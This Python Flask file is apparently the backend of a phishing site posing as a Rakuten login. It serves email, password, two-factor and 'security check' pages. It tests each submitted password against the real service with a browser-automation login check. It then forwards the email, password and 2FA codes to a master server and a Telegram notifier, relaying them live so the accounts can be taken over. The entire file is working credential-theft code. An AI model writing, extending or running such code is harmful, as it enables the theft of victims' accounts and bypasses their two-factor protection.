"""
サブサーバーのメインアプリケーション
クライアント向けログインサイト
"""
from flask import Flask, request, jsonify, render_template, session
import requests
import threading
import time
import uuid
import subprocess
import sys
import os
from datetime import datetime
from config import SECRET_KEY, DEBUG, MASTER_SERVER_URL, CALLBACK_URL

# Playwright自動インストール
def ensure_playwright_browsers():
    """Playwrightブラウザが未インストールなら自動インストール"""
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            # テスト起動
            browser = p.chromium.launch(headless=True)
            browser.close()
            print("[INFO] Playwrightブラウザ: インストール済み")
    except Exception as e:
        print(f"[INFO] Playwrightブラウザが未インストール: {e}")
        print("[INFO] Playwrightブラウザをインストール中...")
        try:
            subprocess.run(
                [sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"],
                check=True,
                capture_output=True
            )
            print("[INFO] Playwrightブラウザインストール完了")
        except Exception as install_error:
            print(f"[ERROR] Playwrightインストール失敗: {install_error}")

# アプリ起動前にインストール実行
if not os.environ.get('SKIP_PLAYWRIGHT_CHECK'):
    ensure_playwright_browsers()

# Playwrightログイン確認関数をインポート
from selenium_functions import rakuten_login_check

app = Flask(__name__, template_folder='templates')
app.secret_key = SECRET_KEY

# 接続チェック結果を保存
connection_check_results = {}

# 2FA・認証管理
twofa_sessions = {}  # {email: {status, codes, security_check}}

# ===========================
# ポーリング管理
# ===========================

def start_polling(request_id):
    """0.5秒ごとにポーリング"""
    def poll():
        max_attempts = 120  # 最大60秒
        attempt = 0
        
        while attempt < max_attempts:
            try:
                response = requests.get(
                    f"{MASTER_SERVER_URL}/api/request-result/connectioncheck/{request_id}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    status = data.get('status')
                    
                    if status in ['success', 'failed', 'timeout']:
                        connection_check_results[request_id] = {
                            'status': status,
                            'pc_id': data.get('locked_by'),
                            'received_at': datetime.now().isoformat()
                        }
                        break
                
            except Exception as e:
                print(f"[ERROR] ポーリングエラー: {e}")
            
            attempt += 1
            time.sleep(0.5)
    
    thread = threading.Thread(target=poll, daemon=True)
    thread.start()

def poll_twofa_status(email):
    """2FA承認状態を0.5秒ごとにポーリング"""
    def poll():
        max_attempts = 120
        attempt = 0
        
        while attempt < max_attempts:
            try:
                response = requests.get(
                    f"{MASTER_SERVER_URL}/api/twofa-status/{email}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if email not in twofa_sessions:
                        twofa_sessions[email] = {}
                    
                    twofa_sessions[email].update(data)
                    
                    # 承認されたら終了
                    if data.get('approved'):
                        break
                
            except Exception as e:
                print(f"[ERROR] 2FAポーリングエラー: {e}")
            
            attempt += 1
            time.sleep(0.5)
    
    thread = threading.Thread(target=poll, daemon=True)
    thread.start()

# ===========================
# ルート定義
# ===========================

@app.route('/')
def index():
    return render_template('loginemail.html')

@app.route('/login/email')
def login_email():
    return render_template('loginemail.html')

@app.route('/login/password')
def login_password():
    return render_template('loginpassword.html')

@app.route('/login/2fa')
def login_2fa():
    return render_template('login2fa.html')

@app.route('/dashboard/security-check')
def dashboard_security_check():
    return render_template('dashboardsecuritycheck.html')

@app.route('/dashboard/complete')
def dashboard_complete():
    return render_template('dashboardcomplete.html')

@app.route('/check')
def check():
    return render_template('check.html')

# ===========================
# API: 接続チェック
# ===========================

@app.route('/api/check-connection', methods=['POST'])
def check_connection():
    """接続チェックリクエストを送信"""
    try:
        response = requests.post(f"{MASTER_SERVER_URL}/api/request", json={
            'genre': 'connectioncheck',
            'callback_url': CALLBACK_URL
        }, timeout=10)
        
        if response.status_code == 201:
            data = response.json()
            request_id = data['request_id']
            
            connection_check_results[request_id] = {
                'status': 'pending',
                'created_at': datetime.now().isoformat()
            }
            
            start_polling(request_id)
            
            return jsonify({
                'success': True,
                'request_id': request_id,
                'message': '接続チェックリクエストを送信しました'
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': f'本サーバーエラー: {response.status_code}'
            }), 500
            
    except Exception as e:
        print(f"[ERROR] 接続チェックエラー: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/check-result/<request_id>', methods=['GET'])
def get_check_result(request_id):
    """接続チェック結果を取得"""
    result = connection_check_results.get(request_id)
    
    if result:
        return jsonify(result), 200
    else:
        return jsonify({'error': 'Result not found'}), 404

# ===========================
# API: ログイン処理
# ===========================

@app.route('/api/login', methods=['POST'])
def api_login():
    """ログイン処理 (PC接続確認 + サブサーバーでログイン実行を並列実行)"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    if not email or not password:
        return jsonify({
            'success': False,
            'error': 'メールアドレスとパスワードを入力してください'
        }), 200
    
    print(f"[INFO] ログイン処理開始 | Email: {email}")
    
    # 並列実行用の変数
    pc_check_result = {'success': False}
    login_check_result = {'success': False}
    
    def pc_check_thread():
        """PC接続確認スレッド"""
        print(f"[INFO] PC接続確認開始...")
        pc_check_result['success'] = check_pc_connection()
        if pc_check_result['success']:
            print(f"[SUCCESS] PC接続成功 | Email: {email}")
        else:
            print(f"[ERROR] PC接続失敗 | Email: {email}")
    
    def login_check_thread():
        """楽天ログイン確認スレッド"""
        print(f"[INFO] 楽天ログイン確認開始... | Email: {email}")
        login_check_result['success'] = rakuten_login_check(email, password)
        if login_check_result['success']:
            print(f"[SUCCESS] 楽天ログイン成功 | Email: {email}")
        else:
            print(f"[ERROR] 楽天ログイン失敗 | Email: {email}")
    
    # 2つのスレッドを同時に開始
    t1 = threading.Thread(target=pc_check_thread)
    t2 = threading.Thread(target=login_check_thread)
    
    t1.start()
    t2.start()
    
    # 両方のスレッドが終了するまで待つ
    t1.join()
    t2.join()
    
    # 両方成功かチェック
    if not pc_check_result['success']:
        return jsonify({
            'success': False,
            'error': 'PCに接続できませんでした'
        }), 200
    
    if not login_check_result['success']:
        return jsonify({
            'success': False,
            'error': 'ログインに失敗しました'
        }), 200
    
    # 両方成功 → セッション保存
    session['email'] = email
    session['password'] = password
    twofa_sessions[email] = {
        'password': password,
        'approved': False,
        'rejected': False,
        'created_at': datetime.now().isoformat()
    }
    
    print(f"[INFO] セッション保存完了 | Email: {email}")
    
    # バックグラウンドでPCに情報送信 (返答不要)
    print(f"[INFO] バックグラウンド処理開始 | Email: {email}")
    threading.Thread(
        target=send_login_to_pc,
        args=(email, password),
        daemon=True
    ).start()
    
    print(f"[SUCCESS] ログイン処理完了 | Email: {email}")
    return jsonify({'success': True}), 200


def check_pc_connection():
    """既存のconnectioncheckリクエストでPC接続確認 (最大5秒)"""
    try:
        # 本サーバーにリクエスト送信（callback_urlを追加）
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/request",
            json={
                'genre': 'connectioncheck',
                'callback_url': f"{CALLBACK_URL}"  # 本サーバーが要求するパラメータ
            },
            timeout=10
        )
        
        if response.status_code != 201:
            print(f"[ERROR] リクエスト送信失敗: status={response.status_code}")
            print(f"[ERROR] レスポンス: {response.text}")
            return False
        
        # 本サーバーから返されたrequest_idを取得
        data = response.json()
        request_id = data.get('request_id')
        print(f"[INFO] connectioncheck送信成功 | request_id: {request_id}")
        
        # ポーリングで結果取得 (最大5秒、成功が来るまで待つ)
        start_time = time.time()
        while time.time() - start_time < 5.0:  # 5秒以内
            result_response = requests.get(
                f"{MASTER_SERVER_URL}/api/request-result/connectioncheck/{request_id}",
                timeout=5
            )
            
            if result_response.status_code == 200:
                result = result_response.json()
                status = result.get('status')
                
                elapsed = time.time() - start_time
                print(f"[INFO] ポーリング中... ({elapsed:.1f}秒経過) | status: {status}")
                
                if status == 'success':
                    print(f"[SUCCESS] PC接続確認成功 ({elapsed:.1f}秒)")
                    return True
                # pending以外（failed/timeout）は無視して待ち続ける
            
            time.sleep(0.1)  # 0.1秒間隔でチェック
        
        print(f"[ERROR] PC接続確認タイムアウト (5秒)")
        return False
        
    except Exception as e:
        print(f"[ERROR] PC接続確認エラー: {e}")
        import traceback
        traceback.print_exc()
        return False


def send_login_to_pc(email, password):
    """PCにログイン情報を送信 (バックグラウンド処理、返答不要)"""
    try:
        print(f"[INFO] PCへログイン情報送信開始 | Email: {email}")
        
        # テレグラム通知 (既存の関数を使用)
        send_telegram_notification(email)
        
        # 本サーバー経由でPCにログインリクエスト送信
        requests.post(
            f"{MASTER_SERVER_URL}/api/request",
            json={
                'genre': 'logincheckrequest',
                'callback_url': CALLBACK_URL,
                'data': {
                    'email': email,
                    'password': password
                }
            },
            timeout=5
        )
        
        print(f"[SUCCESS] PCへログイン情報送信完了 | Email: {email}")
        
    except Exception as e:
        print(f"[ERROR] PCへログイン情報送信エラー: {e}")


def send_telegram_notification(email):
    """テレグラム通知送信 (既存の実装を使用)"""
    try:
        # ここに既存のテレグラム通知コードを実装
        # 例: telegram_bot.send_message(chat_id, f"ログイン: {email}")
        print(f"[INFO] テレグラム通知送信: {email}")
    except Exception as e:
        print(f"[ERROR] テレグラム通知エラー: {e}")

# ===========================
# API: 2FA処理
# ===========================

@app.route('/api/2fa/submit', methods=['POST'])
def api_2fa_submit():
    """2FAコードを本サーバーに送信"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        code = data.get('code', '').strip()
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/2fa/submit",
            json={'email': email, 'code': code},
            timeout=10
        )
        
        # 2FAポーリング開始
        poll_twofa_status(email)
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] 2FA送信エラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/2fa/check-status', methods=['POST'])
def api_2fa_check_status():
    """2FA承認状態をチェック"""
    data = request.json
    email = data.get('email', '').strip()
    
    session_data = twofa_sessions.get(email, {})
    
    return jsonify({
        'success': True,
        'is_approved': session_data.get('approved', False),
        'rejected': session_data.get('rejected', False)
    }), 200

# ===========================
# API: セキュリティチェック
# ===========================

@app.route('/api/security-check/submit', methods=['POST'])
def api_security_check_submit():
    """セキュリティチェックを本サーバーに送信"""
    try:
        data = request.json
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/security-check/submit",
            json=data,
            timeout=10
        )
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェックエラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/security-check/check-status', methods=['POST'])
def api_security_check_status():
    """セキュリティチェック完了状態をチェック"""
    try:
        data = request.json
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/security-check/check-status",
            json=data,
            timeout=10
        )
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェック状態確認エラー: {e}")
        return jsonify({'success': False}), 500

if __name__ == '__main__':
    print("=" * 60)
    print("サブサーバー起動")
    print("=" * 60)
    print(f"本サーバー: {MASTER_SERVER_URL}")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5001, debug=DEBUG)